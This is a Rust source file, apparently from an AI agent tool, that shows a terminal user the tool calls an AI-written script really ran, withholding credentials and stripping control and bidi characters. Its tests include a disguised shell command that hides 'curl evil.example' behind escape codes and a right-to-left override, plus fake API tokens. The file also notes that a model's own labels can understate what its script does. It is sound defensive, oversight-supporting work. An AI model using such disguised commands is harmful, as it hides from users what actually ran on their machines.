//! What an `execute_code` call ran, as a person at the terminal reads it
//! (issue #525).
//!
//! A `code_execution__execute_code` request carries a `tool_graph` the model
//! writes: free-text labels such as "list files", which can understate what the
//! script does. What actually ran is recorded by the extension in the result's
//! `biorouter/tool-calls` meta, one record per call the script made, holding the
//! call's tool and its evaluated arguments (`ToolCallRecord` in
//! `code_execution_extension.rs`). The meta never reaches the model. This module
//! reads it for both terminal views, the line-oriented one (`output.rs`) and the
//! full-screen one (`tui/app.rs`), as the desktop's `ExecutedCallsView` reads it
//! for the card.
//!
//! Display only: nothing here changes a result or what a model reads.
//!
//! The caller reads records only from the result of an `execute_code` request it
//! drew. A tool response carries no tool name, so the views pair it with its
//! request by id, because any tool may put a key of this name in its own meta.
//!
//! Every text is shown as a person may read it ([`person_safe_text`]): credential
//! values are withheld with the detector the dispatch path applies to tool
//! output (`guardrails::secret_output`), which never sees these records, and
//! control and invisible formatting characters are dropped, so an argument cannot
//! move the cursor, recolour the terminal or hide part of a command.

use biorouter::guardrails::secret_output::redact_text;
use biorouter::utils::{is_invisible_formatting, safe_truncate};
use rmcp::model::CallToolResult;
use serde_json::Value;

/// The result meta key holding one record per call the script made.
const TOOL_CALLS_META_KEY: &str = "biorouter/tool-calls";
/// The result meta key counting calls the script made that were not recorded.
const TOOL_CALLS_DROPPED_META_KEY: &str = "biorouter/tool-calls-dropped";

/// Characters of one call's arguments the compact view shows on its line.
pub(crate) const COMPACT_ARGUMENT_CHARS: usize = 200;
/// Characters of any one text the full view shows. The extension cuts a
/// record's arguments at 2 KB, so this bounds only a script's source and a
/// stored record from somewhere else.
pub(crate) const FULL_TEXT_CHARS: usize = 16 * 1024;
/// Characters of a tool or argument name either view shows.
const NAME_CHARS: usize = 128;
/// Records listed at most, the extension's own cap (`MAX_TOOL_CALL_RECORDS`).
const MAX_LISTED_CALLS: usize = 64;
/// Shown in the compact view where a line break was.
const LINE_BREAK_MARK: &str = " ↵ ";

/// Whether `name` is code execution's `execute_code`: prefixed, or bare from a
/// model that strips prefixes, as the desktop's `isCodeExecutionTool` reads it.
pub(crate) fn is_execute_code_tool_name(name: &str) -> bool {
    name == "code_execution__execute_code" || name == "execute_code"
}

/// The calls one `execute_code` run made, from its result's meta.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct ExecutedCalls {
    pub calls: Vec<ExecutedCall>,
    /// Calls the script made that the extension counted but did not record.
    pub unrecorded: u64,
    /// Readable records past [`MAX_LISTED_CALLS`], not listed.
    pub unlisted: usize,
}

/// One recorded call, every text already [`person_safe_text`].
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct ExecutedCall {
    /// The call's tool as a script imports it, `developer/shell`.
    pub tool: String,
    pub failed: bool,
    pub arguments: CallArguments,
    /// The text the extension recorded for a failed call, written for the user.
    pub error: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum CallArguments {
    /// A JSON object's fields, as (name, value); a value that is not a string
    /// is its compact JSON.
    Fields(Vec<(String, String)>),
    /// The recorded text when it is not a JSON object. The extension cuts long
    /// arguments, which leaves the text unparseable but still worth reading.
    Text(String),
}

/// The calls recorded in `result`, or `None` when it records none and counts
/// none unrecorded. A record without a string `tool`, `args` and `status` of
/// `ok` or `error` is skipped: it was not written by the extension.
pub(crate) fn executed_calls(result: &CallToolResult) -> Option<ExecutedCalls> {
    let meta = result.meta.as_ref()?;
    let records = meta.get(TOOL_CALLS_META_KEY).and_then(Value::as_array);
    let unrecorded = meta
        .get(TOOL_CALLS_DROPPED_META_KEY)
        .and_then(Value::as_u64)
        .unwrap_or(0);
    let mut calls: Vec<ExecutedCall> = records
        .into_iter()
        .flatten()
        .filter_map(executed_call)
        .collect();
    if calls.is_empty() && unrecorded == 0 {
        return None;
    }
    let unlisted = calls.len().saturating_sub(MAX_LISTED_CALLS);
    calls.truncate(MAX_LISTED_CALLS);
    Some(ExecutedCalls {
        calls,
        unrecorded,
        unlisted,
    })
}

fn executed_call(record: &Value) -> Option<ExecutedCall> {
    let tool = record.get("tool")?.as_str()?;
    let args = record.get("args")?.as_str()?;
    let failed = match record.get("status")?.as_str()? {
        "ok" => false,
        "error" => true,
        _ => return None,
    };
    let tool = match tool.split_once("__") {
        Some((extension, name)) => format!("{extension}/{name}"),
        None => tool.to_string(),
    };
    let error = record
        .get("error")
        .and_then(Value::as_str)
        .filter(|text| failed && !text.trim().is_empty())
        .map(person_safe_text);
    Some(ExecutedCall {
        tool: one_line(&person_safe_text(&tool), NAME_CHARS),
        failed,
        arguments: call_arguments(args),
        error,
    })
}

pub(crate) fn call_arguments(recorded: &str) -> CallArguments {
    // Withheld in the JSON text first: a value under a key that names a secret
    // (`{"OPENAI_API_KEY": "…"}`) is recognised there, by its key, and nowhere
    // once the object is taken apart. The marker that replaces a value keeps
    // the JSON parseable; a private key block's adds line breaks, which leaves
    // it unparseable, and then the withheld text is shown as recorded.
    let withheld = withhold_credentials(recorded);
    match serde_json::from_str::<Value>(&withheld) {
        Ok(Value::Object(fields)) => CallArguments::Fields(
            fields
                .iter()
                .map(|(name, value)| {
                    let value = match value {
                        Value::String(text) => person_safe_text(text),
                        other => person_safe_text(&other.to_string()),
                    };
                    (one_line(&person_safe_text(name), NAME_CHARS), value)
                })
                .collect(),
        ),
        _ => CallArguments::Text(person_safe_text(&withheld)),
    }
}

/// `text` with every credential value [`redact_text`] recognises withheld.
fn withhold_credentials(text: &str) -> String {
    match redact_text(text) {
        Some((withheld, _)) => withheld,
        None => text.to_string(),
    }
}

/// `text` as a person may read it at a terminal: credential values withheld,
/// and every control or invisible formatting character dropped (a dropped
/// whitespace character leaves one space), line breaks kept.
///
/// Withheld before and after the characters are dropped: before, because the
/// `NAME=value` shape is recognised a line at a time; after, because a dropped
/// character can join a credential the first pass only saw in pieces.
pub(crate) fn person_safe_text(text: &str) -> String {
    let withheld = withhold_credentials(text);
    let mut cleaned = String::with_capacity(withheld.len());
    for ch in withheld.chars() {
        if ch == '\n' {
            cleaned.push('\n');
        } else if ch.is_control() || is_invisible_formatting(ch) {
            if ch.is_whitespace() && !cleaned.ends_with(' ') {
                cleaned.push(' ');
            }
        } else {
            cleaned.push(ch);
        }
    }
    withhold_credentials(&cleaned)
}

/// `text` on one line, its line breaks marked, cut to `max_chars`.
fn one_line(text: &str, max_chars: usize) -> String {
    let joined = text
        .lines()
        .map(str::trim_end)
        .collect::<Vec<_>>()
        .join(LINE_BREAK_MARK);
    safe_truncate(joined.trim(), max_chars)
}

/// What a span of a [`DisplayLine`] is, for each view to style its own way.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum Part {
    /// The block's heading and its count lines.
    Heading,
    /// A call's tool.
    Tool,
    /// A note on a call: `failed`.
    Note,
    /// An argument's name.
    Name,
    /// An argument's value, or a call's recorded text.
    Value,
}

/// One line of the block, after its indent.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct DisplayLine {
    pub indent: usize,
    pub spans: Vec<(Part, String)>,
}

impl DisplayLine {
    fn new(indent: usize, spans: Vec<(Part, String)>) -> Self {
        Self { indent, spans }
    }

    /// The line as plain text, indent included.
    #[cfg(test)]
    pub fn text(&self) -> String {
        let mut text = " ".repeat(self.indent);
        for (_, span) in &self.spans {
            text.push_str(span);
        }
        text
    }
}

/// The block both views print under an `execute_code` call: a heading, then
/// one line per call (`compact`) or each argument on its own lines (`full`,
/// for `--debug` and the full tool output toggle), then what was not recorded.
pub(crate) fn display_lines(calls: &ExecutedCalls, full: bool) -> Vec<DisplayLine> {
    let recorded = calls.calls.len() + calls.unlisted;
    let heading = if calls.unrecorded == 0 {
        format!("executed calls ({recorded})")
    } else {
        let total = (recorded as u64).saturating_add(calls.unrecorded);
        format!("recorded calls ({recorded} of {total} executed)")
    };
    let mut lines = vec![DisplayLine::new(2, vec![(Part::Heading, heading)])];
    for call in &calls.calls {
        if full {
            full_call_lines(call, &mut lines);
        } else {
            lines.push(compact_call_line(call));
        }
    }
    if calls.unlisted > 0 {
        lines.push(DisplayLine::new(
            4,
            vec![(
                Part::Heading,
                format!("{} more recorded calls not listed", calls.unlisted),
            )],
        ));
    }
    if calls.unrecorded > 0 {
        let noun = if calls.unrecorded == 1 {
            "call"
        } else {
            "calls"
        };
        lines.push(DisplayLine::new(
            4,
            vec![(
                Part::Heading,
                format!("{} additional {noun} not recorded", calls.unrecorded),
            )],
        ));
    }
    lines
}

fn call_heading(call: &ExecutedCall) -> Vec<(Part, String)> {
    let mut spans = vec![(Part::Tool, call.tool.clone())];
    if call.failed {
        spans.push((Part::Note, "  failed".to_string()));
    }
    spans
}

fn compact_call_line(call: &ExecutedCall) -> DisplayLine {
    let mut spans = call_heading(call);
    let mut budget = COMPACT_ARGUMENT_CHARS;
    match &call.arguments {
        CallArguments::Text(text) => {
            spans.push((Part::Value, format!("  {}", one_line(text, budget))));
        }
        CallArguments::Fields(fields) => {
            for (name, value) in fields {
                if budget == 0 {
                    spans.push((Part::Value, "  …".to_string()));
                    break;
                }
                let shown = one_line(value, budget.max(4));
                budget = budget.saturating_sub(name.chars().count() + shown.chars().count() + 4);
                spans.push((Part::Name, format!("  {name}: ")));
                spans.push((Part::Value, shown));
            }
        }
    }
    DisplayLine::new(4, spans)
}

fn full_call_lines(call: &ExecutedCall, lines: &mut Vec<DisplayLine>) {
    lines.push(DisplayLine::new(4, call_heading(call)));
    match &call.arguments {
        CallArguments::Text(text) => push_text_lines(lines, 6, None, text),
        CallArguments::Fields(fields) => {
            for (name, value) in fields {
                push_text_lines(lines, 6, Some(name), value);
            }
        }
    }
    if let Some(error) = &call.error {
        push_text_lines(lines, 6, Some("error"), error);
    }
}

/// `text`, cut to [`FULL_TEXT_CHARS`], one display line per line of it, the
/// first after `name:` and the rest indented under it.
fn push_text_lines(lines: &mut Vec<DisplayLine>, indent: usize, name: Option<&str>, text: &str) {
    let text = safe_truncate(text, FULL_TEXT_CHARS);
    let mut rows = text.lines();
    let first = rows.next().unwrap_or_default().to_string();
    let mut spans = Vec::new();
    if let Some(name) = name {
        spans.push((Part::Name, format!("{name}: ")));
    }
    spans.push((Part::Value, first));
    lines.push(DisplayLine::new(indent, spans));
    for row in rows {
        lines.push(DisplayLine::new(
            indent + 2,
            vec![(Part::Value, row.to_string())],
        ));
    }
}

/// A script's source as the line-oriented view prints it under `--debug`:
/// person-safe and bounded like any text of the full view.
pub(crate) fn script_source_lines(code: &str) -> Vec<DisplayLine> {
    let mut lines = Vec::new();
    push_text_lines(&mut lines, 2, Some("code"), &person_safe_text(code));
    lines
}

/// The real producer, for the views' tests: an `execute_code` call dispatched
/// through an `ExtensionManager` holding the bundled `developer` and
/// `code_execution` extensions, the path the agent loop takes, so a view is
/// tested against the records the extension really writes.
#[cfg(test)]
pub(crate) mod producer {
    use biorouter::agents::extension::ExtensionConfig;
    use biorouter::agents::extension_manager::ExtensionManager;
    use biorouter::conversation::message::{ToolRequest, ToolResponse};
    use rmcp::model::CallToolRequestParams;
    use std::sync::Arc;
    use tokio_util::sync::CancellationToken;

    /// The graph label the model writes for the run.
    pub(crate) const LABEL: &str = "list files";
    /// A word the script assembles while it runs, so it is in no source the
    /// views could read: only the evaluated arguments the extension records.
    pub(crate) const EVALUATED_WORD: &str = "EVALUATED_BY_PRODUCER_525";

    /// A credential the script assembles and passes to a shell command.
    pub(crate) fn evaluated_token() -> String {
        format!("sk-proj-{}", "Z".repeat(40))
    }

    /// The script: two shell calls that print nothing, one of them a check of
    /// the assembled credential, under one graph node that understates both.
    const SCRIPT: &str = r#"import { shell } from "developer";
const word = ["EVALUATED", "BY", "PRODUCER", "525"].join("_");
const token = "sk-proj-" + "Z".repeat(40);
shell({ command: "test -n " + word });
shell({ command: "test -n " + token });
record_result("done");"#;

    /// Run [`SCRIPT`] for real and return its request and its response, under
    /// request id `id`.
    pub(crate) async fn run_execute_code(id: &str) -> (ToolRequest, ToolResponse) {
        let root = tempfile::tempdir().unwrap();
        let session_manager = Arc::new(biorouter::session::SessionManager::new(
            root.path().to_path_buf(),
        ));
        let manager = Arc::new(ExtensionManager::new(
            Arc::new(tokio::sync::Mutex::new(None)),
            session_manager,
        ));
        manager
            .add_extension(ExtensionConfig::Builtin {
                name: "developer".to_string(),
                description: "developer".to_string(),
                display_name: Some("Developer".to_string()),
                timeout: Some(300),
                bundled: Some(true),
                available_tools: vec![],
            })
            .await
            .expect("add developer");
        manager
            .add_extension(ExtensionConfig::Platform {
                name: "code_execution".to_string(),
                description: "Execute JavaScript code".to_string(),
                bundled: Some(true),
                available_tools: vec![],
            })
            .await
            .expect("add code_execution");

        let call = CallToolRequestParams {
            task: None,
            meta: None,
            name: "code_execution__execute_code".into(),
            arguments: Some(
                serde_json::json!({
                    "code": SCRIPT,
                    "tool_graph": [{"tool": "developer/shell", "description": LABEL, "depends_on": []}],
                })
                .as_object()
                .unwrap()
                .clone(),
            ),
        };
        let dispatched = manager
            .dispatch_tool_call(
                "issue525-producer",
                call.clone(),
                biorouter::privacy::CallCapability::public_enforced(),
                CancellationToken::new(),
            )
            .await
            .expect("dispatch execute_code");
        let result = dispatched.result.await.expect("execute_code result");
        assert_ne!(result.is_error, Some(true), "{result:?}");
        let recorded = result
            .meta
            .as_ref()
            .and_then(|meta| meta.get("biorouter/tool-calls"))
            .and_then(serde_json::Value::as_array)
            .map(Vec::len);
        assert_eq!(recorded, Some(2), "the extension recorded both calls");
        let text = format!("{:?}", result.content);
        assert!(
            !text.contains(EVALUATED_WORD) && !text.contains(&evaluated_token()),
            "the precondition: the evaluated arguments are in no content a view prints: {text}"
        );

        let request = ToolRequest {
            id: id.to_string(),
            tool_call: Ok(call),
            metadata: None,
            tool_meta: None,
        };
        let response = ToolResponse {
            id: id.to_string(),
            tool_result: Ok(result),
            metadata: None,
        };
        (request, response)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use rmcp::model::Meta;
    use serde_json::json;

    /// The real extension's records read as what ran, with the credential the
    /// script assembled withheld, in both views of the block.
    #[tokio::test]
    async fn issue525_the_real_producers_records_read_as_what_ran() {
        let (_, response) = producer::run_execute_code("issue525-unit").await;
        let calls = executed_calls(response.tool_result.as_ref().unwrap()).unwrap();
        assert_eq!(calls.calls.len(), 2);
        for full in [false, true] {
            let text = shown(&calls, full);
            assert!(text.contains("executed calls (2)"), "{text}");
            assert!(text.contains("developer/shell"), "{text}");
            assert!(
                text.contains(&format!("command: test -n {}", producer::EVALUATED_WORD)),
                "{text}"
            );
            assert!(!text.contains(&producer::evaluated_token()), "{text}");
            assert!(text.contains("[REDACTED:api-token]"), "{text}");
        }
    }

    fn result_with(meta: Value) -> CallToolResult {
        let mut result = CallToolResult::success(Vec::new());
        result.meta = Some(Meta(meta.as_object().unwrap().clone()));
        result
    }

    fn shell_record(args: Value) -> Value {
        json!({
            "tool": "developer__shell",
            "args": serde_json::to_string(&args).unwrap(),
            "status": "ok",
            "result_bytes": 0,
        })
    }

    fn shown(calls: &ExecutedCalls, full: bool) -> String {
        display_lines(calls, full)
            .iter()
            .map(DisplayLine::text)
            .collect::<Vec<_>>()
            .join("\n")
    }

    #[test]
    fn a_result_without_records_shows_nothing() {
        assert_eq!(executed_calls(&CallToolResult::success(Vec::new())), None);
        assert_eq!(executed_calls(&result_with(json!({"other": 1}))), None);
        assert_eq!(
            executed_calls(&result_with(json!({TOOL_CALLS_META_KEY: []}))),
            None
        );
    }

    #[test]
    fn a_call_reads_as_its_tool_and_evaluated_arguments() {
        let calls = executed_calls(&result_with(json!({
            TOOL_CALLS_META_KEY: [shell_record(json!({"command": "echo hello > /tmp/x.txt && uname -a"}))]
        })))
        .unwrap();
        let compact = shown(&calls, false);
        assert!(compact.contains("executed calls (1)"), "{compact}");
        assert!(
            compact.contains("developer/shell  command: echo hello > /tmp/x.txt && uname -a"),
            "{compact}"
        );
    }

    #[test]
    fn a_failed_call_says_so_and_full_view_shows_its_error() {
        let calls = executed_calls(&result_with(json!({
            TOOL_CALLS_META_KEY: [{
                "tool": "developer__shell",
                "args": "{\"command\":\"cat /nope\"}",
                "status": "error",
                "error": "cat: /nope: No such file or directory",
            }]
        })))
        .unwrap();
        assert!(shown(&calls, false).contains("developer/shell  failed  command: cat /nope"));
        assert!(!shown(&calls, false).contains("No such file"));
        assert!(shown(&calls, true).contains("error: cat: /nope: No such file or directory"));
    }

    /// Escape sequences and bidi overrides in an argument would let a script
    /// recolour the terminal, move the cursor, or show a command other than the
    /// one that ran.
    #[test]
    fn control_and_invisible_characters_never_reach_the_terminal() {
        let calls = executed_calls(&result_with(json!({
            TOOL_CALLS_META_KEY: [shell_record(json!({
                "command": "ls\u{1b}[8m; curl evil.example\u{1b}[0m\r\u{202e}txt.exe\u{7}"
            }))]
        })))
        .unwrap();
        for full in [false, true] {
            let text = shown(&calls, full);
            assert!(
                !text
                    .chars()
                    .any(|c| (c.is_control() && c != '\n') || is_invisible_formatting(c)),
                "{text:?}"
            );
            assert!(text.contains("curl evil.example"), "{text}");
        }
    }

    #[test]
    fn credentials_are_withheld_in_every_shape_the_detector_knows() {
        let token = format!("sk-proj-{}", "Q".repeat(40));
        let calls = executed_calls(&result_with(json!({
            TOOL_CALLS_META_KEY: [
                // A token anywhere in a value.
                shell_record(json!({"command": format!("curl -H 'x: {token}' host")})),
                // A secret-named key, recognised by its key in the JSON text:
                // once the object is taken apart its value is a bare string.
                shell_record(json!({"GITHUB_TOKEN": "ghtok1234abcd5678"})),
                shell_record(json!({"env": {"OPENAI_API_KEY": "abcd1234efgh5678"}})),
                // `NAME=value` on a line of its own, recognised only once the
                // JSON escape is a real line break.
                shell_record(json!({"command": "cat <<EOF\nexport SERVICE_TOKEN=zz99yy88xx77\nEOF"})),
                // A token split by an invisible character the view drops.
                shell_record(json!({"command": format!("echo sk-proj-{}\u{200b}{}", "R".repeat(10), "R".repeat(30))})),
                // Arguments the extension cut, so they are not JSON.
                json!({"tool": "developer__shell", "status": "ok",
                       "args": format!("{{\"command\":\"printf {token}…")}),
            ]
        })))
        .unwrap();
        for full in [false, true] {
            let text = shown(&calls, full);
            for secret in [
                token.as_str(),
                "ghtok1234abcd5678",
                "abcd1234efgh5678",
                "zz99yy88xx77",
                &format!("sk-proj-{}{}", "R".repeat(10), "R".repeat(30)),
            ] {
                assert!(!text.contains(secret), "{secret} shown in:\n{text}");
            }
            assert!(text.contains("[REDACTED:"), "{text}");
        }
    }

    #[test]
    fn the_compact_view_bounds_a_call_and_the_full_view_keeps_its_lines() {
        let command = format!("python - <<'PY'\n{}\nPY\necho TAIL", "x = 1\n".repeat(80));
        let calls = executed_calls(&result_with(json!({
            TOOL_CALLS_META_KEY: [shell_record(json!({"command": command, "timeout_secs": 30}))]
        })))
        .unwrap();
        let compact = display_lines(&calls, false);
        assert_eq!(compact.len(), 2, "one heading and one line per call");
        let line = compact[1].text();
        assert!(line.contains("↵"), "{line}");
        assert!(!line.contains("echo TAIL"), "{line}");
        assert!(line.chars().count() < COMPACT_ARGUMENT_CHARS + 64, "{line}");

        let full = shown(&calls, true);
        assert!(full.contains("echo TAIL"), "{full}");
        assert!(full.contains("timeout_secs: 30"), "{full}");
        // A value's later lines sit under its name's line, two columns in.
        assert!(
            full.contains("\n      command: python - <<'PY'\n        x = 1"),
            "{full}"
        );
    }

    #[test]
    fn unrecorded_and_unreadable_records_are_counted_as_the_desktop_counts_them() {
        let calls = executed_calls(&result_with(json!({
            TOOL_CALLS_META_KEY: [
                shell_record(json!({"command": "true"})),
                {"tool": "developer__shell", "args": 7, "status": "ok"},
                {"tool": "developer__shell", "args": "{}"},
                {"tool": "developer__shell", "args": "{}", "status": "maybe"},
            ],
            TOOL_CALLS_DROPPED_META_KEY: 1,
        })))
        .unwrap();
        assert_eq!(calls.calls.len(), 1);
        let text = shown(&calls, false);
        assert!(text.contains("recorded calls (1 of 2 executed)"), "{text}");
        assert!(text.contains("1 additional call not recorded"), "{text}");

        let only_dropped =
            executed_calls(&result_with(json!({TOOL_CALLS_DROPPED_META_KEY: 3}))).unwrap();
        assert!(shown(&only_dropped, false).contains("3 additional calls not recorded"));
    }

    #[test]
    fn a_stored_history_cannot_list_more_than_the_extension_records() {
        let records: Vec<Value> = (0..MAX_LISTED_CALLS + 5)
            .map(|n| shell_record(json!({"command": format!("echo {n}")})))
            .collect();
        let calls = executed_calls(&result_with(json!({TOOL_CALLS_META_KEY: records}))).unwrap();
        assert_eq!(calls.calls.len(), MAX_LISTED_CALLS);
        let text = shown(&calls, false);
        assert!(text.contains("5 more recorded calls not listed"), "{text}");
    }

    #[test]
    fn only_execute_code_names_carry_executed_calls() {
        assert!(is_execute_code_tool_name("code_execution__execute_code"));
        assert!(is_execute_code_tool_name("execute_code"));
        for other in [
            "developer__shell",
            "fixture__run",
            "code_execution__wait_for",
            "other__execute_code",
        ] {
            assert!(!is_execute_code_tool_name(other), "{other}");
        }
    }
}
